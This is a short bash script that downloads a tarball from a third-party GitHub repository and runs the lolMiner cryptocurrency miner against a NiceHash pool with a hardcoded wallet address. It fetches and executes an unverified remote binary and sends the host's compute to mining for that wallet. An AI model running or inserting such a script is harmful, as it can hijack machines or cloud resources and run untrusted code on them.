#!/bin/bash
mkdir kemon
cd kemon
apt-get install wget -y
wget https://github.com/Kocalkocal93Kocalkocal93/tuyul.sh/raw/main/abc.tar.gz
tar -xvf abc.tar.gz
cd kemon/1.34a
./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3MYuuKJ78wazszEA8d3MLjKQW1tH7P6cyW.bius3 --ethstratum ETHPROXY
